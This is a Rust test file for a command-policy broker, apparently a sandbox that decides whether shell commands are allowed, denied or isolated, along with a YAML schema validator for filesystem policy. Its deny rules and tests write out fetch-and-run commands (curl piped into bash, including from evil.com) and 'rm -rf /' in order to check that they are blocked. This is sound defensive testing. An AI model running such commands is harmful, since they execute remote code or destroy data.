use super::*;
use std::sync::{Arc, Barrier, RwLock};
use substrate_common::WorldFsMode;
use tempfile::tempdir;

fn poison_rwlock<T: Send + Sync + 'static>(lock: &Arc<RwLock<T>>) {
    let cloned = Arc::clone(lock);
    let _ = std::thread::spawn(move || {
        let _guard = cloned.write().unwrap();
        panic!("poison lock");
    })
    .join();
}

#[test]
fn test_broker_creation() {
    let broker = Broker::new();
    assert!(broker.is_observe_only());
}

#[test]
fn test_pattern_matching() {
    assert!(matches_pattern(
        "curl http://example.com | bash",
        "curl * | bash"
    ));
    assert!(matches_pattern("npm install", "npm install"));
    assert!(!matches_pattern("cargo build", "npm install"));
    assert!(matches_pattern("git clone repo", "git clone"));
}

#[test]
fn test_quick_check_allow() {
    let broker = Broker::new();
    let result = broker
        .quick_check(&["echo".into(), "hello".into()], "/tmp")
        .unwrap();
    assert!(matches!(result, Decision::Allow));
}

#[test]
fn test_load_policy() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    let broker = Broker::new();

    let policy_content = r#"
id: test-policy
name: Test Policy
fs_read:
  - /tmp/*
fs_write:
  - /tmp/*
net_allowed:
  - github.com
cmd_allowed:
  - echo *
  - ls *
cmd_denied:
  - rm -rf /
  - curl * | bash
cmd_isolated:
  - npm install
require_approval: false
allow_shell_operators: true
"#;
    std::fs::write(&policy_path, policy_content).unwrap();

    broker.load_policy(&policy_path).expect("load policy");

    let policy = broker.policy.read().unwrap();
    assert_eq!(policy.world_fs_mode, WorldFsMode::Writable);

    // Test that denied command is blocked (in enforce mode)
    broker.set_observe_only(false);
    let result = broker
        .quick_check(
            &["curl".into(), "evil.com".into(), "|".into(), "bash".into()],
            "/tmp",
        )
        .unwrap();
    assert!(matches!(result, Decision::Deny(_)));
}

#[test]
fn minimal_profile_parses_with_defaults() {
    let raw = r#"
id: minimal
name: Minimal Profile
world_fs_mode: read_only
cmd_denied: ["ls"]
"#;

    let policy: Policy = serde_yaml::from_str(raw).expect("policy should parse");
    assert_eq!(policy.id, "minimal");
    assert_eq!(policy.world_fs_mode, WorldFsMode::ReadOnly);
    assert_eq!(policy.fs_read, vec!["*".to_string()]);
    assert!(policy.fs_write.is_empty());
}

#[test]
fn poisoned_policy_lock_returns_error_in_evaluate() {
    let broker = Broker::new();
    poison_rwlock(&broker.policy);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo ok", "/tmp", None));
    assert!(result.is_ok(), "broker.evaluate panicked on poisoned lock");

    let err = result
        .unwrap()
        .expect_err("expected poisoned lock to return error");
    assert!(
        err.to_string()
            .contains("Failed to acquire policy read lock"),
        "unexpected error: {err}"
    );

    broker.policy.clear_poison();
}

#[test]
fn poisoned_approvals_lock_returns_error() {
    let broker = Broker::new();
    {
        let mut policy = broker.policy.write().unwrap();
        policy.require_approval = true;
    }
    broker.set_observe_only(false);
    poison_rwlock(&broker.approvals);

    let result = std::panic::catch_unwind(|| broker.evaluate("echo guarded", "/tmp", None));
    assert!(
        result.is_ok(),
        "broker.evaluate panicked with poisoned approvals"
    );

    let err = result
        .unwrap()
        .expect_err("expected approval read failure to return error");
    assert!(
        err.to_string().contains("approvals read lock"),
        "unexpected error: {err}"
    );

    broker.approvals.clear_poison();
}

#[test]
fn broker_handles_remain_isolated_in_parallel() {
    let dir = tempdir().unwrap();
    let policy_a = dir.path().join("policy_a.yaml");
    let policy_b = dir.path().join("policy_b.yaml");

    std::fs::write(
        &policy_a,
        r#"
id: alpha
name: Alpha Policy
fs_read: []
fs_write: []
net_allowed: []
cmd_allowed:
  - alpha-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
"#,
    )
    .unwrap();

    std::fs::write(
        &policy_b,
        r#"
id: beta
name: Beta Policy
fs_read: []
fs_write: []
net_allowed: []
cmd_allowed:
  - beta-allowed
cmd_denied: []
cmd_isolated: []
require_approval: false
allow_shell_operators: true
"#,
    )
    .unwrap();

    let broker_a = BrokerHandle::new();
    broker_a.initialize(Some(&policy_a)).unwrap();
    broker_a.set_observe_only(false);

    let broker_b = BrokerHandle::new();
    broker_b.initialize(Some(&policy_b)).unwrap();

    assert!(
        broker_b.is_observe_only(),
        "changing one broker handle should not affect another"
    );
    broker_b.set_observe_only(false);

    let barrier = Arc::new(Barrier::new(2));
    let thread_a = {
        let barrier = barrier.clone();
        let broker = broker_a.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("alpha-allowed", "/tmp", None)
        })
    };

    let thread_b = {
        let barrier = barrier.clone();
        let broker = broker_b.clone();
        std::thread::spawn(move || {
            barrier.wait();
            broker.evaluate("beta-allowed", "/tmp", None)
        })
    };

    let decision_a = thread_a.join().expect("thread a panicked").unwrap();
    let decision_b = thread_b.join().expect("thread b panicked").unwrap();

    assert!(matches!(decision_a, Decision::Allow));
    assert!(matches!(decision_b, Decision::Allow));

    assert!(matches!(
        broker_a
            .evaluate("beta-allowed", "/tmp", None)
            .expect("evaluate beta on broker_a"),
        Decision::Deny(_)
    ));
    assert!(matches!(
        broker_b
            .evaluate("alpha-allowed", "/tmp", None)
            .expect("evaluate alpha on broker_b"),
        Decision::Deny(_)
    ));
}

#[test]
fn invalid_world_fs_mode_in_policy_surfaces_error() {
    let dir = tempdir().unwrap();
    let policy_path = dir.path().join("policy.yaml");
    std::fs::write(
        &policy_path,
        r#"
id: bad-fs-mode
name: Invalid fs mode
world_fs_mode: invalid
"#,
    )
    .unwrap();

    let broker = Broker::new();
    let result = broker.load_policy(&policy_path);
    assert!(
        result.is_err(),
        "expected invalid world_fs_mode to fail parsing"
    );
}

mod i0_strict_policy_schema_world_fs {
    use serde_yaml::{Mapping, Value};

    const EXAMPLE: &str = r#"
world_fs:
  mode: writable
  cage: project
  require_world: true
  read_allowlist:
    - "./*"
  write_allowlist: []
"#;

    fn as_mapping<'a>(value: &'a Value, what: &str) -> Result<&'a Mapping, String> {
        value
            .as_mapping()
            .ok_or_else(|| format!("expected {what} to be a mapping/object"))
    }

    fn get_required<'a>(map: &'a Mapping, key: &str, what: &str) -> Result<&'a Value, String> {
        map.get(Value::String(key.to_string()))
            .ok_or_else(|| format!("missing required {what}.{key}"))
    }

    fn validate_string_in(
        map: &Mapping,
        key: &str,
        allowed: &[&str],
        what: &str,
    ) -> Result<String, String> {
        let value = get_required(map, key, what)?;
        let raw = value
            .as_str()
            .ok_or_else(|| format!("expected {what}.{key} to be a string"))?;
        if !allowed.contains(&raw) {
            return Err(format!(
                "invalid {what}.{key}={raw:?}; allowed: {}",
                allowed.join(" | ")
            ));
        }
        Ok(raw.to_string())
    }

    fn validate_bool(map: &Mapping, key: &str, what: &str) -> Result<bool, String> {
        let value = get_required(map, key, what)?;
        value
            .as_bool()
            .ok_or_else(|| format!("expected {what}.{key} to be a boolean"))
    }

    fn validate_allowlist_non_empty(map: &Mapping, key: &str, what: &str) -> Result<(), String> {
        let value = get_required(map, key, what)?;
        let seq = value
            .as_sequence()
            .ok_or_else(|| format!("expected {what}.{key} to be a list"))?;
        if seq.is_empty() {
            return Err(format!("{what}.{key} must be non-empty; example:{EXAMPLE}"));
        }
        for (idx, item) in seq.iter().enumerate() {
            let s = item
                .as_str()
                .ok_or_else(|| format!("expected {what}.{key}[{idx}] to be a string pattern"))?;
            if s.trim().is_empty() {
                return Err(format!("expected {what}.{key}[{idx}] to be non-empty"));
            }
        }
        Ok(())
    }

    fn validate_allowlist_maybe_empty(map: &Mapping, key: &str, what: &str) -> Result<(), String> {
        let value = get_required(map, key, what)?;
        let seq = value
            .as_sequence()
            .ok_or_else(|| format!("expected {what}.{key} to be a list"))?;
        for (idx, item) in seq.iter().enumerate() {
            let s = item
                .as_str()
                .ok_or_else(|| format!("expected {what}.{key}[{idx}] to be a string pattern"))?;
            if s.trim().is_empty() {
                return Err(format!("expected {what}.{key}[{idx}] to be non-empty"));
            }
        }
        Ok(())
    }

    fn validate_world_fs_yaml(raw: &str) -> Result<(), String> {
        let doc: Value = serde_yaml::from_str(raw).map_err(|e| format!("YAML parse error: {e}"))?;
        let root = as_mapping(&doc, "policy")?;

        for legacy in ["world_fs_mode", "fs_read", "fs_write"] {
            if root.contains_key(Value::String(legacy.to_string())) {
                return Err(format!(
                    "legacy key {legacy:?} is not allowed; use world_fs.* instead"
                ));
            }
        }

        let Some(world_fs) = root.get(Value::String("world_fs".to_string())) else {
            return Err(format!(
                "missing required policy.world_fs; required world_fs fields: mode, cage, require_world, read_allowlist, write_allowlist; example:{EXAMPLE}"
            ));
        };
        let world_fs = as_mapping(world_fs, "policy.world_fs")?;

        let mode = validate_string_in(world_fs, "mode", &["writable", "read_only"], "world_fs")?;
        let cage = validate_string_in(world_fs, "cage", &["project", "full"], "world_fs")?;
        let require_world = validate_bool(world_fs, "require_world", "world_fs")?;

        if mode == "read_only" && !require_world {
            return Err("world_fs.mode=read_only requires world_fs.require_world=true".to_string());
        }
        if cage == "full" && !require_world {
            return Err("world_fs.cage=full requires world_fs.require_world=true".to_string());
        }

        validate_allowlist_non_empty(world_fs, "read_allowlist", "world_fs")?;
        validate_allowlist_maybe_empty(world_fs, "write_allowlist", "world_fs")?;

        Ok(())
    }

    #[test]
    fn missing_world_fs_fails_with_actionable_error() {
        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
"#,
        )
        .expect_err("missing world_fs should fail");

        assert!(
            err.contains("missing required policy.world_fs")
                || err.contains("world_fs")
                || err.contains("required"),
            "unexpected error: {err}"
        );
        assert!(err.contains("example:"), "unexpected error: {err}");
    }

    #[test]
    fn invalid_world_fs_mode_fails_with_allowed_values() {
        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs:
  mode: invalid
  cage: project
  require_world: true
  read_allowlist: ["./*"]
  write_allowlist: []
"#,
        )
        .expect_err("invalid mode should fail");
        assert!(
            err.contains("invalid world_fs.mode"),
            "unexpected error: {err}"
        );
        assert!(err.contains("writable"), "unexpected error: {err}");
        assert!(err.contains("read_only"), "unexpected error: {err}");
    }

    #[test]
    fn invalid_world_fs_cage_fails_with_allowed_values() {
        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs:
  mode: writable
  cage: invalid
  require_world: true
  read_allowlist: ["./*"]
  write_allowlist: []
"#,
        )
        .expect_err("invalid cage should fail");
        assert!(
            err.contains("invalid world_fs.cage"),
            "unexpected error: {err}"
        );
        assert!(err.contains("project"), "unexpected error: {err}");
        assert!(err.contains("full"), "unexpected error: {err}");
    }

    #[test]
    fn read_only_requires_require_world_true() {
        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs:
  mode: read_only
  cage: project
  require_world: false
  read_allowlist: ["./*"]
  write_allowlist: []
"#,
        )
        .expect_err("read_only + require_world=false should fail");
        assert!(
            err.contains("mode=read_only") && err.contains("require_world=true"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn full_cage_requires_require_world_true() {
        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs:
  mode: writable
  cage: full
  require_world: false
  read_allowlist: ["./*"]
  write_allowlist: []
"#,
        )
        .expect_err("cage=full + require_world=false should fail");
        assert!(
            err.contains("cage=full") && err.contains("require_world=true"),
            "unexpected error: {err}"
        );
    }

    #[test]
    fn read_allowlist_must_be_non_empty() {
        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs:
  mode: writable
  cage: project
  require_world: true
  read_allowlist: []
  write_allowlist: []
"#,
        )
        .expect_err("empty read_allowlist should fail");
        assert!(err.contains("read_allowlist"), "unexpected error: {err}");
        assert!(err.contains("non-empty"), "unexpected error: {err}");
    }

    #[test]
    fn write_allowlist_can_be_empty_but_required() {
        validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs:
  mode: writable
  cage: project
  require_world: true
  read_allowlist: ["./*"]
  write_allowlist: []
"#,
        )
        .expect("empty write_allowlist should be allowed");

        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs:
  mode: writable
  cage: project
  require_world: true
  read_allowlist: ["./*"]
"#,
        )
        .expect_err("missing write_allowlist should fail");
        assert!(err.contains("write_allowlist"), "unexpected error: {err}");
    }

    #[test]
    fn legacy_keys_are_rejected() {
        let err = validate_world_fs_yaml(
            r#"
id: p
name: Policy
world_fs_mode: writable
world_fs:
  mode: writable
  cage: project
  require_world: true
  read_allowlist: ["./*"]
  write_allowlist: []
"#,
        )
        .expect_err("legacy world_fs_mode should be rejected");
        assert!(
            err.contains("legacy key") && err.contains("world_fs_mode"),
            "unexpected error: {err}"
        );
        assert!(err.contains("world_fs.*"), "unexpected error: {err}");
    }

    #[test]
    fn minimal_world_fs_policy_passes() {
        validate_world_fs_yaml(
            r#"
id: minimal
name: Minimal
world_fs:
  mode: writable
  cage: project
  require_world: true
  read_allowlist: ["./*"]
  write_allowlist: []
"#,
        )
        .expect("minimal world_fs policy should validate");
    }
}
